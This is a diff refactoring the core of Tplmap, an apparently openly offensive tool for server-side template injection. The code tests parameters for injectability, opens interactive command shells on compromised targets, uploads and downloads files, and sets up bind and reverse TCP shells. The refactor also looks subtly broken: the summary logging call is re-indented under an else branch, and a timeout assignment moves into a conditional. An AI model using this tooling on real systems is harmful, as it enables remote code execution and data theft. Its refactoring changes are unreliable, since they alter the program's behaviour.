@@ -61,9 +61,9 @@ def _print_injection_summary(channel):
     suffix = channel.data.get('suffix', '').replace('\n', '\\n')
 
     if channel.data.get('evaluate_blind'):
-        evaluation = 'ok, %s code (blind)' % (channel.data.get('language'))
+        evaluation = f"ok, {channel.data.get('language')} code (blind)"
     elif channel.data.get('evaluate'):
-        evaluation = 'ok, %s code' % (channel.data.get('language'))
+        evaluation = f"ok, {channel.data.get('language')} code"
     else:
         evaluation = 'no'
 
@@ -75,14 +75,11 @@ def _print_injection_summary(channel):
         execution = 'no'
 
     if channel.data.get('write'):
-        if channel.data.get('blind'):
-            writing = 'ok (blind)'
-        else:
-            writing = 'ok'
+        writing = 'ok (blind)' if channel.data.get('blind') else 'ok'
     else:
         writing = 'no'
 
-    log.info("""Tplmap identified the following injection point:
+        log.info("""Tplmap identified the following injection point:
 
   %(method)s parameter: %(parameter)s
   Engine: %(engine)s
@@ -98,36 +95,29 @@ def _print_injection_summary(channel):
    File read: %(read)s
    Code evaluation: %(evaluate)s
 """ % ({
-    'prefix': prefix,
-    'render': render,
-    'suffix': suffix,
-    'context': 'text' if (not prefix and not suffix) else 'code',
-    'engine': channel.data.get('engine').capitalize(),
-    'os': channel.data.get('os', 'undetected'),
-    'injtype' : 'blind' if channel.data.get('blind') else 'render',
-    'evaluate': evaluation,
-    'execute': execution,
-    'write': writing,
-    'read': 'no' if not channel.data.get('read') else 'ok',
-    'bind_shell': 'no' if not channel.data.get('bind_shell') else 'ok',
-    'method': channel.injs[channel.inj_idx]['field'],
-    'parameter': channel.injs[channel.inj_idx]['param']
-}))
+        'prefix': prefix,
+        'render': render,
+        'suffix': suffix,
+        'context': 'text' if (not prefix and not suffix) else 'code',
+        'engine': channel.data.get('engine').capitalize(),
+        'os': channel.data.get('os', 'undetected'),
+        'injtype' : 'blind' if channel.data.get('blind') else 'render',
+        'evaluate': evaluation,
+        'execute': execution,
+        'write': writing,
+        'read': 'no' if not channel.data.get('read') else 'ok',
+        'bind_shell': 'no' if not channel.data.get('bind_shell') else 'ok',
+        'method': channel.injs[channel.inj_idx]['field'],
+        'parameter': channel.injs[channel.inj_idx]['param']
+    }))
 
 def detect_template_injection(channel, plugins = plugins):
 
     # Loop manually the channel.injs modifying channel's inj_idx
-    if sys.version_info.major >= 2 :
-        wrappedRange = range
-    else :
-        wrappedRange = xrange
-
-    for i in wrappedRange(len(channel.injs)):
-
-        log.info("Testing if %s parameter '%s' is injectable" % (
-            channel.injs[channel.inj_idx]['field'],
-            channel.injs[channel.inj_idx]['param']
-            )
+    wrappedRange = range if sys.version_info.major >= 2 else xrange
+    for _ in wrappedRange(len(channel.injs)):
+        log.info(
+            f"Testing if {channel.injs[channel.inj_idx]['field']} parameter '{channel.injs[channel.inj_idx]['param']}' is injectable"
         )
 
         current_plugin = None
@@ -195,7 +185,10 @@ def check_template_injection(channel):
                 print(current_plugin.execute_blind(channel.args.get('os_cmd')))
             elif channel.args.get('os_shell'):
                 log.info('Run commands on the operating system.')
-                Shell(current_plugin.execute_blind, '%s (blind) $ ' % (channel.data.get('os', ''))).cmdloop()
+                Shell(
+                    current_plugin.execute_blind,
+                    f"{channel.data.get('os', '')} (blind) $ ",
+                ).cmdloop()
 
         elif channel.data.get('execute'):
             if channel.args.get('os_cmd'):
@@ -203,7 +196,7 @@ def check_template_injection(channel):
             elif channel.args.get('os_shell'):
                 log.info('Run commands on the operating system.')
 
-                Shell(current_plugin.execute, '%s $ ' % (channel.data.get('os', ''))).cmdloop()
+                Shell(current_plugin.execute, f"{channel.data.get('os', '')} $ ").cmdloop()
 
         else:
             log.error('No system command execution capabilities have been detected on the target.')
@@ -224,16 +217,13 @@ def check_template_injection(channel):
                 print(call(channel.args.get('tpl_code')))
             elif channel.args.get('tpl_shell'):
                 log.info('Inject multi-line template code. Press ctrl-D to send the lines')
-                MultilineShell(call, '%s > ' % (channel.data.get('engine', ''))).cmdloop()
+                MultilineShell(call, f"{channel.data.get('engine', '')} > ").cmdloop()
 
         else:
-                log.error('No code evaluation capabilities have been detected on the target')
+            log.error('No code evaluation capabilities have been detected on the target')
 
 
-    # Perform file upload
-    local_remote_paths = channel.args.get('upload')
-    if local_remote_paths:
-
+    if local_remote_paths := channel.args.get('upload'):
         if channel.data.get('write'):
 
             local_path, remote_path = local_remote_paths
@@ -246,10 +236,7 @@ def check_template_injection(channel):
         else:
                 log.error('No file upload capabilities have been detected on the target')
 
-    # Perform file read
-    remote_local_paths = channel.args.get('download')
-    if remote_local_paths:
-
+    if remote_local_paths := channel.args.get('download'):
         if channel.data.get('read'):
 
             remote_path, local_path = remote_local_paths
@@ -263,10 +250,7 @@ def check_template_injection(channel):
 
             log.error('No file download capabilities have been detected on the target')
 
-    # Connect to tcp shell
-    bind_shell_port = channel.args.get('bind_shell')
-    if bind_shell_port:
-
+    if bind_shell_port := channel.args.get('bind_shell'):
         if channel.data.get('bind_shell'):
 
             urlparsed = urlparse.urlparse(channel.base_url)
@@ -303,15 +287,13 @@ def check_template_injection(channel):
 
             log.error('No TCP shell opening capabilities have been detected on the target')
 
-    # Accept reverse tcp connections
-    reverse_shell_host_port = channel.args.get('reverse_shell')
-    if reverse_shell_host_port:
+    if reverse_shell_host_port := channel.args.get('reverse_shell'):
         host, port = reverse_shell_host_port
-        timeout = 15
-
         if channel.data.get('reverse_shell'):
 
             current_plugin.reverse_shell(host, port)
+
+            timeout = 15
 
             # Run tcp server
             try:
